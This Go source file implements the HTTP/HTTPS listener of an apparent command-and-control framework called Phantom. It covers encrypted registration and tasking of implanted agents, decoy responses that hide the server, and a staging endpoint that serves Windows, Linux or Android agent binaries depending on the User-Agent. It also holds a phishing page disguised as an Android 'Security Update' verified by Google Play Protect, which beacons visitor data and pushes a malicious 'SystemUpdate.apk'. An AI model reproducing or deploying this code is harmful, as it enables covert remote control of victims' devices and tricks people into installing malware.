package listener

import (
	"context"
	"crypto/rsa"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

// EventCallback is called when notable events occur (agent registration, check-in, etc.).
type EventCallback func(event string, args ...interface{})

// HTTPListener handles HTTP/HTTPS C2 communications.
type HTTPListener struct {
	ID         string
	Name       string
	Type       string // "http" or "https"
	BindAddr   string
	Profile    *Profile
	TLSCert    string
	TLSKey     string

	server     *http.Server
	privKey    *rsa.PrivateKey
	agentMgr   *agent.Manager
	taskDisp   *task.Dispatcher
	onEvent    EventCallback
	running    bool
	database   interface{ InsertLoot(l *db.LootRecord) error }
}

// ListenerConfig holds the configuration for creating a new listener.
type ListenerConfig struct {
	ID       string
	Name     string
	Type     string
	BindAddr string
	Profile  *Profile
	TLSCert  string
	TLSKey   string
	PrivKey  *rsa.PrivateKey
	AgentMgr *agent.Manager
	TaskDisp *task.Dispatcher
	OnEvent  EventCallback
	Database interface{ InsertLoot(l *db.LootRecord) error } // For mobile cred capture
}

// NewHTTPListener creates a new HTTP/HTTPS listener.
func NewHTTPListener(cfg ListenerConfig) *HTTPListener {
	return &HTTPListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		Type:     cfg.Type,
		BindAddr: cfg.BindAddr,
		Profile:  cfg.Profile,
		TLSCert:  cfg.TLSCert,
		TLSKey:   cfg.TLSKey,
		privKey:  cfg.PrivKey,
		agentMgr: cfg.AgentMgr,
		taskDisp: cfg.TaskDisp,
		onEvent:  cfg.OnEvent,
		database: cfg.Database,
	}
}

// Start begins listening for connections.
func (l *HTTPListener) Start() error {
	mux := http.NewServeMux()

	// Register C2 routes
	mux.HandleFunc(l.Profile.RegisterURI, l.handleRegister)
	mux.HandleFunc(l.Profile.CheckInURI, l.handleCheckIn)

	// Decoy routes
	for _, uri := range l.Profile.DecoyURIs {
		mux.HandleFunc(uri, l.handleDecoy)
	}

	// Mobile agent endpoints (plain JSON — no encryption)
	if l.database != nil {
		mobileDB, _ := l.database.(*db.Database)
		if mobileDB != nil {
			mobileHandler := NewMobileHandler(l.agentMgr, l.taskDisp, mobileDB, l.onEvent)
			mobileHandler.RegisterRoutes(mux)
		}
	}

	// Staging endpoint — serves agent binaries to stagers
	mux.HandleFunc("/api/v1/update", l.handleStaging)

	// APK delivery — phishing page at /app, direct download at /app/download
	mux.HandleFunc("/app", l.handleAPKPage)
	mux.HandleFunc("/app/download", l.handleAPKDownload)

	// Catch-all for any other request
	mux.HandleFunc("/", l.handleDecoy)

	l.server = &http.Server{
		Addr:         l.BindAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	l.running = true
	l.emitEvent("listener_start", l.Name, l.Type, l.BindAddr)

	var err error
	if l.Type == "https" {
		err = l.server.ListenAndServeTLS(l.TLSCert, l.TLSKey)
	} else {
		err = l.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		l.running = false
		return err
	}
	return nil
}

// Stop gracefully shuts down the listener.
func (l *HTTPListener) Stop() error {
	l.running = false
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	l.emitEvent("listener_stop", l.Name)
	return l.server.Shutdown(ctx)
}

// IsRunning returns whether the listener is active.
func (l *HTTPListener) IsRunning() bool {
	return l.running
}

// handleRegister processes agent registration requests.
func (l *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.serveDecoy(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20)) // 1MB limit
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Unwrap HTTP JSON wrapper
	env, err := protocol.UnwrapFromHTTP(body)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	if env.Type != protocol.MsgRegisterRequest {
		l.serveDecoy(w, r)
		return
	}

	// RSA decrypt to get session key + registration payload
	sessionKey, regPayload, err := crypto.UnpackKeyExchange(l.privKey, env.Payload)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Deserialize registration request
	var regReq protocol.RegisterRequest
	if err := protocol.Unmarshal(regPayload, &regReq); err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Get external IP
	externalIP := extractIP(r)

	// Register the agent
	agentRecord, err := l.agentMgr.Register(&regReq, sessionKey, externalIP, l.ID)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	l.emitEvent("agent_register", agentRecord.Name, agentRecord.OS, agentRecord.Hostname, agentRecord.Username, externalIP)

	// Build response
	regResp := protocol.RegisterResponse{
		AgentID: agentRecord.ID,
		Name:    agentRecord.Name,
		Sleep:   agentRecord.Sleep,
		Jitter:  agentRecord.Jitter,
	}

	respPayload, err := protocol.Marshal(regResp)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	// Encrypt response with session key
	respEnv, err := protocol.SealEnvelope(protocol.MsgRegisterResponse, sessionKey, respPayload)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	httpResp, err := protocol.WrapForHTTP(respEnv, time.Now().Unix())
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	l.writeResponse(w, httpResp)
}

// handleCheckIn processes agent check-in requests.
func (l *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.serveDecoy(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20)) // 10MB limit for file transfers
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Unwrap HTTP JSON wrapper
	env, err := protocol.UnwrapFromHTTP(body)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Find session key by KeyID
	agentID, sessionKey, found := l.agentMgr.FindAgentByKeyID(env.KeyID)
	if !found {
		l.serveDecoy(w, r)
		return
	}

	// Decrypt envelope
	plaintext, err := protocol.OpenEnvelope(env, sessionKey)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Deserialize check-in
	var checkIn protocol.CheckInRequest
	if err := protocol.Unmarshal(plaintext, &checkIn); err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Update last seen
	l.agentMgr.CheckIn(agentID)

	// Process any results
	for _, result := range checkIn.Results {
		result.AgentID = agentID
		l.taskDisp.ProcessResult(&result)
		l.emitEvent("task_result", agentID, result.TaskID)
	}

	// Get pending tasks
	tasks, err := l.taskDisp.GetPendingTasks(agentID)
	if err != nil {
		tasks = nil
	}

	// Build response
	resp := protocol.CheckInResponse{Tasks: tasks}
	respPayload, err := protocol.Marshal(resp)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	respEnv, err := protocol.SealEnvelope(protocol.MsgCheckInResponse, sessionKey, respPayload)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	httpResp, err := protocol.WrapForHTTP(respEnv, time.Now().Unix())
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	l.writeResponse(w, httpResp)
}

// handleStaging serves agent binaries to stagers at /api/v1/update.
// Determines OS from User-Agent and serves the appropriate binary.
func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
	ua := r.Header.Get("User-Agent")

	// Find project root by walking up to go.mod
	root := "."
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			root = dir
			break
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}

	// Determine which agent binary to serve based on User-Agent
	var agentPath string
	if strings.Contains(ua, "Android") {
		agentPath = filepath.Join(root, "build", "payloads", "phantom-android.apk")
	} else if strings.Contains(ua, "Windows") || strings.Contains(ua, "Win64") || strings.Contains(ua, "Win32") || strings.Contains(ua, "WNS") || strings.Contains(ua, "PWSH") {
		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
	} else {
		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
	}

	data, err := os.ReadFile(agentPath)
	if err != nil {
		// Try the other OS as fallback
		if strings.Contains(agentPath, "windows") {
			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
		} else {
			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
		}
		data, err = os.ReadFile(agentPath)
		if err != nil {
			l.serveDecoy(w, r)
			return
		}
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Write(data)
	l.emitEvent("staging_download", extractIP(r), filepath.Base(agentPath))
}

// handleAPKPage serves a convincing "System Update" phishing page that
// auto-downloads the APK when the victim visits http://C2:PORT/app.
// The page looks like a standard Android system update prompt.
func (l *HTTPListener) handleAPKPage(w http.ResponseWriter, r *http.Request) {
	// Log the visit
	l.emitEvent("apk_page_visit", extractIP(r), r.Header.Get("User-Agent"))

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>System Security Update</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.card { background: white; border-radius: 16px; padding: 32px 24px; max-width: 400px; margin: 20px; box-shadow: 0 4px 24px rgba(0,0,0,0.12); text-align: center; }
.icon { font-size: 64px; margin-bottom: 16px; }
h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 8px; }
.version { color: #666; font-size: 13px; margin-bottom: 20px; }
p { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
.features { text-align: left; margin: 0 auto 24px; max-width: 280px; }
.features li { color: #333; font-size: 13px; margin-bottom: 8px; list-style: none; padding-left: 24px; position: relative; }
.features li:before { content: "✓"; color: #4CAF50; font-weight: bold; position: absolute; left: 0; }
.btn { display: inline-block; width: 100%; background: #1a73e8; color: white; border: none; padding: 14px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background 0.2s; }
.btn:hover { background: #1557b0; }
.btn:active { transform: scale(0.98); }
.meta { color: #999; font-size: 11px; margin-top: 16px; }
.progress { display: none; margin-top: 16px; }
.progress-bar { background: #e0e0e0; border-radius: 4px; height: 6px; overflow: hidden; }
.progress-fill { background: #1a73e8; height: 100%; width: 0; border-radius: 4px; animation: fill 2s ease-in-out forwards; }
@keyframes fill { to { width: 100%; } }
.progress-text { color: #666; font-size: 12px; margin-top: 8px; }
</style>
</head>
<body>
<div class="card">
<div class="icon">🛡️</div>
<h1>Security Update Available</h1>
<div class="version">Version 2026.04.1 • 16 KB</div>
<p>A critical security patch is ready for your device. This update addresses recent vulnerabilities and improves system protection.</p>
<ul class="features">
<li>Patches CVE-2026-0412 security vulnerability</li>
<li>Improves app permission management</li>
<li>Updates system certificate store</li>
<li>Enhanced malware protection</li>
</ul>
<a href="/app/download" class="btn" id="dl-btn" onclick="showProgress()">Install Security Update</a>
<div class="progress" id="progress">
<div class="progress-bar"><div class="progress-fill"></div></div>
<div class="progress-text">Downloading update...</div>
</div>
<div class="meta">Google Play Protect • Verified by Android Security</div>
</div>
<script>
function showProgress() {
    document.getElementById('dl-btn').style.display = 'none';
    document.getElementById('progress').style.display = 'block';
    // Beacon device info
    fetch('/api/v1/creds', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            source: 'apk_download',
            ua: navigator.userAgent,
            ts: new Date().toISOString(),
            url: location.href
        })
    }).catch(function(){});
}
</script>
</body>
</html>`)
}

// handleAPKDownload serves the built APK as a direct download.
func (l *HTTPListener) handleAPKDownload(w http.ResponseWriter, r *http.Request) {
	root := findProjectRoot()
	apkPath := filepath.Join(root, "build", "payloads", "phantom-android.apk")

	data, err := os.ReadFile(apkPath)
	if err != nil {
		// APK not built yet — tell operator
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(404)
		fmt.Fprint(w, "APK not generated yet. Generate it from the Phantom Web UI: Payloads → Android Payload → Generate")
		return
	}

	l.emitEvent("apk_download", extractIP(r), r.Header.Get("User-Agent"))

	w.Header().Set("Content-Type", "application/vnd.android.package-archive")
	w.Header().Set("Content-Disposition", `attachment; filename="SystemUpdate.apk"`)
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Write(data)
}

// findProjectRoot walks up to find go.mod.
func findProjectRoot() string {
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return "."
}

// handleDecoy serves fake responses to non-agent traffic.
func (l *HTTPListener) handleDecoy(w http.ResponseWriter, r *http.Request) {
	l.serveDecoy(w, r)
}

// serveDecoy writes the decoy response with profile headers.
func (l *HTTPListener) serveDecoy(w http.ResponseWriter, r *http.Request) {
	headers := l.Profile.ResolveHeaders()
	for k, v := range headers {
		w.Header().Set(k, v)
	}
	w.Header().Set("Content-Type", l.Profile.ContentType)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(l.Profile.DecoyResponse))
}

// writeResponse writes a C2 response with profile headers.
func (l *HTTPListener) writeResponse(w http.ResponseWriter, data []byte) {
	headers := l.Profile.ResolveHeaders()
	for k, v := range headers {
		w.Header().Set(k, v)
	}
	w.Header().Set("Content-Type", l.Profile.ContentType)
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

// emitEvent sends an event to the callback if registered.
func (l *HTTPListener) emitEvent(event string, args ...interface{}) {
	if l.onEvent != nil {
		l.onEvent(event, args...)
	}
}

// extractIP gets the client IP from the request.
func extractIP(r *http.Request) string {
	// Check X-Forwarded-For first (behind proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}

	// Check X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	// Fall back to RemoteAddr
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}
